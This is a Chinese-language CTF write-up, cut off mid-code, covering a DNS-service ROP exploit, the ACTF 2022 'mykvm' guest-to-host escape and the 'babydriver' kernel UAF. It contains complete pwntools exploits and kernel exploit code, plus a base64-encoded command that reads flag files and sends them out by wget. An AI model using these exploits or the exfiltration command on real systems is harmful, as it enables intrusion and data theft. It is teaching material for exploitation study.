![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227161823.png)

这里有多可以考虑的汇编指令

```
xchg 交换寄存器
add 加减 给一目标寄存器赋0也能实现效果

ROPgadget --binary ./dns  | grep  "xchg eax, edx"
ROPgadget --binary ./dns  | grep  "add eax, edx" | grep ret
ROPgadget --binary ./dns  | grep  "xor eax, eax"
ROPgadget --binary ./dns  | grep ret |grep  "mov eax, 0"
ROPgadget --binary ./dns  | grep ret | grep -v "ret " | grep  ": add eax, 0x"
```

结合这几点最终的思路是，给eax一个负数，这样只需要对它进行add操作就能控制eax的值。问题在于payload只能连续0x3f，所以要控制ROP的部分在0x3f以内，还好是32位比较好实现。正好溢出长度能满足2段ROP，一段放ROP，一段放cmd字符串。这里还有一个问题，就是直接把cmd放在开头好不好，在实际执行过程中会导致在执行函数时会向低位增长，可能会把cmd覆盖掉导致无法顺利执行。最好的情况还是放到高位上。

写EXP的tips

```python
# 在python2下
head = "61".decode("hex")
# 将其识别为16进制数的拼接字符串，将其转化为字节流


# system(cmd)/popen(cmd,"r"/"w")
cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)

```


EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256
from scapy.all import *
import base64

p = remote("127.0.0.1","9999",typ="udp")
# p = process("./pwn")
elf = ELF("./dns")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


pop_rax = 0x08059d44
add_eax_xxx = 0x08094d60 # : add eax, 0x11038 ; nop ; pop ebp ; ret
add_eax_edx = 0x0804b639 # : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret
pop_edx = 0x0807ec72 # : pop edx ; ret
popen = 0x08071802


head = "24b401200001000000000001".decode("hex")
end =  '\x00'+"00010001".decode("hex")


pay = p32(pop_rax) + p32(0xfffef38d)
pay += p32(add_eax_xxx)+'aaaa'+p32(add_eax_edx)+'aaaa'*6
pay += p32(pop_edx) +p32(0x0809C7B2)# r
pay += p32(popen)


cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)


payload = head
payload += ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += '\x3f'+ pay.ljust(0x3f,'a') # 0x385+0x40=0x3c5  0x11038+0xfffef38d=0x3c5
payload += chr(len(cmd)).encode()+ cmd
payload += end

# # print(hex(len(pay))) 0x38

s(payload)


ia()
```


### 2022ACTF mykvm

一道kvm的题目

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191717.png)

主函数会malloc一个0x20的堆块放置在bss段上以存储hostname

然后就是输入code代码，以及guest name 和 guest passwd ，然后进入一个KVM的函数实现虚拟机执行命令

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191749.png)

kvm函数如下，kvm的启动可以参照API文档，https://lwn.net/Articles/658511/，其中涉及很多宏的使用

```c
KVM_CREATE_VM 0xae01
KVM_SET_USER_MEMORY_REGION 0x4020ae46
KVM_CREATE_VCPU 0xae41
KVM_GET_VCPU_MMAP_SIZE 0xae04
KVM_GET_REGS 0x8090ae81
KVM_SET_REGS 0x4090ae82
KVM_GET_SREGS 0x8138ae83
KVM_SET_SREGS 0x4138ae84
KVM_RUN 0xae80
```


```c
unsigned __int64 __fastcall sub_400B92(const void *code, size_t codesize)
{
  int kvmfd; // [rsp+10h] [rbp-220h]
  int vmfd; // [rsp+14h] [rbp-21Ch]
  int vcpu; // [rsp+1Ch] [rbp-214h]
  size_t vcpu_mmap_size; // [rsp+30h] [rbp-200h]
  kvm_run *run_mem; // [rsp+38h] [rbp-1F8h]
  kvm_userspace_memory_region region; // [rsp+40h] [rbp-1F0h] BYREF
  char v9[48]; // [rsp+60h] [rbp-1D0h] BYREF
  __int64 v10; // [rsp+90h] [rbp-1A0h]
  kvm_regs guest_regs; // [rsp+E0h] [rbp-150h] BYREF
  unsigned __int64 v12; // [rsp+228h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  kvmfd = open("/dev/kvm", 0x80002); //这部分代码打开 /dev/kvm 设备，获取 KVM 文件描述符。如果打开失败，程序将退出。
  if ( kvmfd == -1 )
    errx(1, "failed to open /dev/kvm");
  vmfd = ioctl(kvmfd, 0xAE01uLL, 0LL); //使用 ioctl 系统调用和KVM 文件描述符来创建一个新的虚拟机，并获取虚拟机的文件描述符。
  memcpy(
    (&unk_602100 - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF) - ((&unk_602100 >> 31) >> 20)) + 4096),// 0x603000
    code,
    codesize);// 这里是让函数地址取整，0x602100 -> 0x603000
  region.slot = 0; // 设置一个内存区域（kvm_userspace_memory_region），包括虚拟机内的物理地址、大小以及对应的用户空间地址。这个内存区域随后通过 ioctl 调用添加到虚拟机中。
  region.flags = 0;
  region.guest_phys_addr = 0LL;
  region.memory_size = 0x40000000LL;
  region.userspace_addr = (&unk_602100
                         - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF)
                          - ((&unk_602100 >> 31) >> 20))
                         + 4096);
  ioctl(vmfd, 0x4020AE46uLL, &region);
  vcpu = ioctl(vmfd, 0xAE41uLL, 0LL); //创建一个虚拟 CPU 并获取相关的信息，如 mmap 大小，然后将其映射到内存中。 vcpu作用于实模式
  vcpu_mmap_size = ioctl(kvmfd, 0xAE04uLL, 0LL);
  run_mem = mmap(0LL, vcpu_mmap_size, 3, 1, vcpu, 0LL);
  ioctl(vcpu, 0x8090AE81uLL, v9); // 初始化虚拟 CPU 的寄存器值。
  guest_regs.rax = 0LL;
  v10 = 0x4000LL;
  guest_regs.rbx = 2LL;
  ioctl(vcpu, 0x4090AE82uLL, v9); // 设置虚拟CPU的值
  ioctl(vcpu, 0x8138AE83uLL, &guest_regs.rcx); //获取sregs的值
  WORD2(guest_regs.rdx) = 0;
  guest_regs.rcx = 0LL;
  ioctl(vcpu, 0x4138AE84uLL, &guest_regs.rcx); //设置sregs的值
  while ( 1 )
  {
    ioctl(vcpu, 0xAE80uLL, 0LL); //这是函数的核心循环，它不断运行虚拟机并根据不同的退出原因（例如 I/O 操作、HLT 指令等）进行处理。
    switch ( run_mem->exit_reason )
    {
      case 2u:
        putchar(*(&run_mem->request_interrupt_window + run_mem->io.data_offset));
        break;
      case 5u:
        fwrite("KVM_EXIT_HLT\n", 1uLL, 0xDuLL, stderr);
        return __readfsqword(0x28u) ^ v12;
      case 8u:
        errx(1, "KVM_EXIT_SHUTDOWN");
      case 9u:
        errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx", run_mem->hw.hardware_exit_reason);
      case 0x11u:
        errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x", run_mem->ex.exception);
      default:
        errx(1, "Unhandled reason: %d", run_mem->exit_reason);
    }
  }
}
```

也就是说，我们输入的code会从栈上memcpy到bss段的0x603000上，而这个0x603000又会被KVM当作内存的开始，我的code就类似于BIOS的存在。

这部分建议阅读
电脑是如何启动的：<https://www.ruanyifeng.com/blog/2013/02/booting.html>

那么漏洞点在哪呢，主要有几处
1、首先是虚拟机的内存大小设置为0x40000000，而0x603000~0x603000+0x40000000包含了./mykvm(主程序)的堆地址，这就导致虚拟机能访问主程序堆地址的内容
2、由于是实模式16位寻址，即2字节，实模式利用一种称为"段:偏移"的方式来扩展寻址能力，最大能够寻址1MB（2^20字节）的物理内存，也就是20位寻址，0x00000 到 0xFFFFF。意味着虚拟机实际能操作的范围为0x603000~0x603000+0xFFFFF，这仍然可能包括堆地址，堆中会有一些main_arena的地址
3、readline函数是libreadline.so.6中的一个库函数
```c
void *__fastcall sub_400F28(__int64 a1)
{
  if ( ptr )
  {
    free(ptr);
    ptr = 0LL;
  }
  ptr = (void *)readline(a1);
  if ( ptr && *(_BYTE *)ptr )
    add_history((__int64)ptr);
  return ptr;
}
```

readline() 的参数是一个字符串，会先输出再读取一行输入，然后返回一个堆块指针。原则上需要free。这里也没有free，连续三次的readline()可以使用同一个堆块，结合我们虚拟机能操作主程序堆段的漏洞，就可以控制输入的内容(本来可以用户控制，这里是指虚拟机控制)。readline()函数会将\x7f作为Delete信号识别，所以输入的内容要控制没有"7f"

4、主函数里读入code的时候采用scanf读入，原则上这段code会被读入栈上，然后被memcpy到0x603000，而memcpy不会被零截断，这样以来栈上的一些值就会被放到bss里
```c
    puts("your code size: ");
    __isoc99_scanf("%d", codesize);
    if ( codesize[0] <= 4096 )
```


这里讲一下题目的启动和调试，由于题目给了docker环境，这里可以直接使用docker进行调试

```shell
docker build -t mykvm .
docker run --privileged --rm -p 8000:8888 -p 1234:1234 -d  mykvm:latest
# --privileged参数用于支持KVM
运行带有pause()的脚本

sudo gdb -p `pidof mykvm`
```


首先是泄露libc，如果泄露也是可以的，通过out指令实现，这也算是官方WP的实现<https://github.com/team-s2/ACTF-2022/blob/main/pwn/mykvm/exploits/exp.py>

```python
shellcode = asm('''
    .code16
    mov al, 0x57  ;"W"
    mov dx, 0x217 ;这里测试为任何值都可以
    out dx, al
    mov al, 10 ;"/n"
    out dx, al
    hlt
''')
```

读端口用IN指令，写端口用OUT指令

```c
IN AL,21H；表示从21H端口读取一字节数据到AL

IN AX,21H；表示从端口地址21H读取1字节数据到AL，从端口地址22H读取1字节到AH

MOV DX,379H
IN AL,DX ；从端口379H读取1字节到AL


OUT 21H,AL；将AL的值写入21H端口
OUT 21H,AX；将AX的值写入端口地址21H开始的连续两个字节。（port[21H]=AL,port[22h]=AH）

MOV DX,378H
OUT DX,AX ；将AH和AL分别写入端口379H和378H
```

这里要考虑如何去最终获取shell，结合got表可写和libc-2.23，可以考虑劫持got表为one_gadget，比如puts，在主程序的最后会输入hostname对主程序bss段上的dest变量进行写入，那是一个bss段变量

```c
      memcpy(dest, *&codesize[1], 0x20uLL);
      puts("Bye!");
```

这里看一下memcpy的原型，其参数为2个指针，意味着数据会被copy到dest指向的堆块中

```c
void *memcpy(void *dest, const void *src, size_t n);
```

而dest 0x60A100正好在虚拟机内存范围内，我们可以将其改为got表的地址，然后再篡改读readline读入堆块里的内容(实测只会清空前8字节的内容)，这样就能修改了。
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231229110828.png)
写汇编的思路：
先拿一个堆地址检测是否堆段在1M范围内，在的话就执行后续payload，不在就控制输出来导向新的remote
先去栈上拿一个libc地址，然后放到bss段上
然后再去拿dest堆块的地址，这个在bss段上，通过字符串搜索搜索到对应的readline堆块的地址，处理后也放到bss段上
然后计算出one_gadget的地址，将其赋值给readline堆块+8，再将dest的值换成putchar的got表地址
这里在对readline堆块+8堆块赋值时，由于实测这个地址大概为0x0157f8(KVM地址)，超过了实模式2字节的寻址范围，所以要用ds段寄存器进行寻址

EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1",8000) #typ="udp"
# p = process("./bin/mykvm")
# elf = ELF("./mykvm")
# libc = elf.libc

# context.log_level = "debug" # info
# context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

p = remote("127.0.0.1",8000)

# libc in stack
# heap_input
# heap+8 in kvm
# got

code = asm('''
    .code16gcc
    jmp main
    .rept 40
    .byte 0x00
    .endr

main:
    mov eax,[0x7100]   
    sub eax,0x603000
    cmp eax,0xfd800
    jb next
    mov ebx,0
    div eax,ebx 

next:
    mov ebx, [0x568]
    add ebx,0x2270cf
    mov [0x7200], ebx
    mov ebx,[0x56c]
    mov [0x7204], ebx

    mov ebx,[0x7100]
    add ebx,0x27e0
    mov [0x7220],ebx

    mov edx,[0x7200]
    add edx,0x4527a	
    push edx

    add ebx,0x8	
    sub ebx,0x603000
    mov eax,ebx

    shr eax,16
    shl eax,12
    mov ds,eax			
    pop edx
    mov ds:[bx],edx

    mov ebx,0x602020
    mov eax,0
    mov ds,eax
    mov [0x7100],ebx
    hlt
''')


c = 1
while c:
    # pause()
    sla("your code size: ",4096)
    sla("your code:",code)
    sla("guest name:",'e4l4')
    sla("guest passwd:",'e4l4')
    # sla("host name: ",'e4l4')
    p.recvline()
    ret = r(0x1b)
    if "mykvm" not in ret:
	    # pause()
        c = 0
        print("got it!!!")
        sl("e4l4")
        break        
    p.close()
    p = remote("127.0.0.1",8000)
    
ia()
```

官方的题解是从16位实模式切换到32位保护模式再进行利用，这里也进行进一步的学习
什么是实模式和保护模式：<https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html>
linux分页的机制：<https://zhuanlan.zhihu.com/p/458935522>
详细内容参考：16位实模式切换32位保护模式过程详解:https://bbs.kanxue.com/thread-269223.htm


> [!NOTE] 笔记
> 16位寻址 2字节 0x1234  20位 0x1234567
> 32位寻址 4字节 0x12345678
> 3个16进制数能表示的范围正好就是4KB，即一页
> 逻辑地址 –[分段]–》 线性地址 –[分页]–》 物理地址
> 
> 
> 

两个进程虚拟地址相同，映射的物理地址也是不同的

```
虚拟内存:  [页0] [页1] [页2] [页3]
物理内存: [页A] [页B] [页C] [页D]


页表:
| 虚拟页号 | 物理页号 | 标志 |
|----------|----------|------|
|    0     |    B     |  RW  |
|    1     |    A     |  R   |
|    2     |    D     |  RW  |
|    3     |    C     |  R   |
```

段标识符长8字节，16位实模式通过GDT全局描述符表寻址，16位正好表示下标

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228134405.png)

一般会在MBR(”这最前面的512个字节，就叫做"主引导记录"（Master boot record，缩写为MBR）“)载入启动管理器中进行实模式到保护模式的切换。然后就能装载加载内核的程序了
从实模式切换到保护模式大致可以分为以下几个步骤：
屏蔽中断
初始化全局描述符表（GDT）
将CR0寄存器最低位置1
执行远跳转
初始化段寄存器和栈指针

实际上可以简化为一个模板
```c
org 0 
cli                     ; 屏蔽中断
 
lgdt [gdt_descriptor]   ; 初始化GDT
 
; 把 cr0 的最低位置为 1，开启保护模式
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
 
[bits 32]
PModeMain:
    mov ax, 0x10        ; 将数据段寄存器ds和附加段寄存器es置为0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fs和gs寄存器由操作系统使用，这里统一设成0x10
    mov gs, ax
    mov ax, 0x18        ; 将栈段寄存器ss置为0x18
    mov ss, ax
    mov ebp, 0x7c00     ; 现在栈顶指向 0x7c00
    mov esp, ebp

	xxx
    hlt

gdt_start:
; 第一个描述符必须是空描述符
gdt_null:
    dd 0
    dd 0
; 代码段描述符
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 数据段描述符
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 栈段描述符
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

解除了寻址为1M的限制，也就不用再爆破地址了,也能直接赋值给0x1f5bb58这样的地址了

exp.asm
```c
org 0 
cli                     ; 屏蔽中断
 
lgdt [gdt_descriptor]   ; 初始化GDT
 
; 把 cr0 的最低位置为 1，开启保护模式
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
times 40 db 0x00
; .endr

[bits 32]
PModeMain:
    mov ax, 0x10        ; 将数据段寄存器ds和附加段寄存器es置为0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fs和gs寄存器由操作系统使用，这里统一设成0x10
    mov gs, ax
    mov ax, 0x18        ; 将栈段寄存器ss置为0x18
    mov ss, ax
    mov ebp, 0x7c00     ; 现在栈顶指向 0x7c00
    mov esp, ebp

    mov ebx, [0x7100]
    add ebx, 0x1b48
    sub ebx, 0x603000
    mov edx, [ebx]		
    sub edx, 0x3c51a8	
    add edx, 0x4527a	; gadget addr
        
    mov  [0x7200], edx
        
    mov ebx, [0x7100]
    add ebx, 0x27e0		; target &nbytes addr
    add ebx, 0x8
    sub ebx, 0x603000	; memcpy arg1 -> &nbytes

    ; pop edx
    mov  edx, [0x7200]
    mov [ebx], edx      ; gadget to &nbytes

    mov ecx, 0x602020
    mov [0x7100],ecx        ; memcpy arg0 -> 0x602020
    hlt


gdt_start:
; 第一个描述符必须是空描述符
gdt_null:
    dd 0
    dd 0
; 代码段描述符
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 数据段描述符
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 栈段描述符
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

exp.py
```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote("127.0.0.1","8000") #typ="udp"
# p = process("./pwn")
elf = ELF("./mykvm")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


with open("./exp.bin", "rb") as f:
    shellcode = f.read()

# pause()
sla("your code size: ",len(shellcode))
sa("your code:",shellcode)
sla("guest name:",'aaaa')
sla("guest passwd:",'bbbb')
sla("host name: ",'cccc')


ia()
```


### babydriver

一道内核的入门题目，首先检查信息
```shell
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1'  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -enable-kvm
```

开启了smep，没有开启kaslr

提取文件系系统，关注其启动文件 init

```shell
excpio rootfs.cpio
```

```shell
➜  rootfs cat init
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

加载了一个内核模块babydriver.ko(关于内核模块的编写这里可以专门学习一下)，内核版本4.4.72

也可以启动以后再查看，同时由于没有开启kalsr，我们提取一下函数符号表

```
/ $ lsmod
babydriver 16384 0 - Live 0xffffffffc0000000 (OE)

cat /proc/kallsyms > /tmp/kallsyms.txt
cat /tmp/kallsyms.txt | grep "prepare_kernel_cred"
cat /tmp/kallsyms.txt | grep "commit_creds"

ffffffff810a1810 T prepare_kernel_cred
ffffffff81d91890 R __ksymtab_prepare_kernel_cred
ffffffff81dac968 r __kcrctab_prepare_kernel_cred
ffffffff81db9450 r __kstrtab_prepare_kernel_cred

ffffffff810a1420 T commit_creds
ffffffff81d88f60 R __ksymtab_commit_creds
ffffffff81da84d0 r __kcrctab_commit_creds
ffffffff81db948c r __kstrtab_commit_creds
```

然后就是分析babydriver.ko这个模块了

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )//为设备分配一个主设备号和一个次设备号,babydev_no 将存储分配的设备号
  {
    cdev_init(&cdev_0, &fops);//初始化字符设备并将其与文件操作结构体 fops 关联
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);//将设备加入系统
    if ( v1 >= 0 )
    {
      v2 = _class_create(&_this_module, "babydev", &babydev_no);//创建一个新的设备类，这个类在 /sys/class 下对应一个目录，/sys/class/babydev
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");//！！！创建了一个设备节点，通常在 /dev 目录下。这使得用户空间的程序可以通过设备文件与驱动程序进行交互。
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240102110359.png)

这里谈一下file_operations，这个结构体会把是个函数功能指针会把常见的函数和模块的函数做一个对应
```c
00000000 file_operations struc ; (sizeof=0xD8, align=0x8, copyof_137)
00000000                                         ; XREF: .data:fops/r
00000000 owner dq ?                              ; offset
00000008 llseek dq ?                             ; offset
00000010 read dq ?                               ; offset
00000018 write dq ?                              ; offset
00000020 read_iter dq ?                          ; offset
00000028 write_iter dq ?                         ; offset
00000030 iterate dq ?                            ; offset
00000038 poll dq ?                               ; offset
00000040 unlocked_ioctl dq ?                     ; offset
00000048 compat_ioctl dq ?                       ; offset
00000050 mmap dq ?                               ; offset
00000058 open dq ?                               ; offset
00000060 flush dq ?                              ; offset
00000068 release dq ?                            ; offset
00000070 fsync dq ?                              ; offset
00000078 aio_fsync dq ?                          ; offset
00000080 fasync dq ?                             ; offset
00000088 lock dq ?                               ; offset
00000090 sendpage dq ?                           ; offset
00000098 get_unmapped_area dq ?                  ; offset
000000A0 check_flags dq ?                        ; offset
000000A8 flock dq ?                              ; offset
000000B0 splice_write dq ?                       ; offset
000000B8 splice_read dq ?                        ; offset
000000C0 setlease dq ?                           ; offset
000000C8 fallocate dq ?                          ; offset
000000D0 show_fdinfo dq ?                        ; offset
000000D8 file_operations ends
```

事实上release函数是当用户空间程序执行 close() 系统调用时调用的函数

通过/dev/babydev就能用通用函数和模块函数进行交互了，结合fops主要定义了几个函数功能

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);// UAF
  printk("device release\n");
  return 0;
}

int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);//在内核内存中分配内存给全局变量babydev_struct.device_buf，(类型，标志，大小)，kmalloc_caches[6]特定大小的 kmem_cache
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n");
  return 0;
}

__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx

  _fentry__(filp, command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);//重新分配一个指定大小的堆块
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    return 0LL;
  }
  else
  {
    printk(&unk_2EB);
    return -22LL;
  }
}


ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();//将用户态的数据(也就是我们输入的)拷贝给babydev_struct.device_buf
    return v6;
  }
  return result;
}

ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);//babydev_struct.device_buf指向的内容拷贝到用户态
    return v6;
  }
  return result;
}

```

babyopen中存在漏洞，简单来说这个功能是用于分配堆块的，这里把分配的指针放到了内核模块的bss段上，就导致了每个新open的该设备的fd所开辟的堆块，被所有使用该设备的fd共用。这是一个逻辑问题，在babyioctl同样存在

babyrelease的UAF漏洞

所以第一种思路就是UAF
fork子进程时，会分配0xa8大小(size)的内核堆，主要用于存储当前进程的一些信息，包括权限等。babyioctl可以分配一个0xa8大小的堆块然后free掉，再执行fork，再结合babyopen的多个fd指针，就可修改fork进程结构体里的内容
对于改子进程cred的方法也有2种思路，核心是子进程要先于父进程执行system("/bin/sh")
+ 可以在父进程设置一个wait(NULL)操作都在子进程中完成
+ 可以在子进程设置一个sleep，且只执行system("/bin/sh")，父进程完成所有操作

EXP

```c
#include<stdlib.h>

int main(){
	int fd1 = open("/dev/babydev",2);
	int fd2 = open("/dev/babydev",2);	

	ioctl(fd1,0x10001,0xa8);
	close(fd1);
	pid_t fpid; 
	fpid=fork();
	if (fpid < 0) 
	{
		printf("error in fork!\n"); 
		exit(0);
	}
	else if (fpid == 0) 
	{
		printf("child pid is : %d\n",getpid());
		char zeros[30] = {0};
		write(fd2,zeros,28);
		system("/bin/sh");
		exit(0);
	}
	// {
	// 	printf("child pid is : %d\n",getpid());
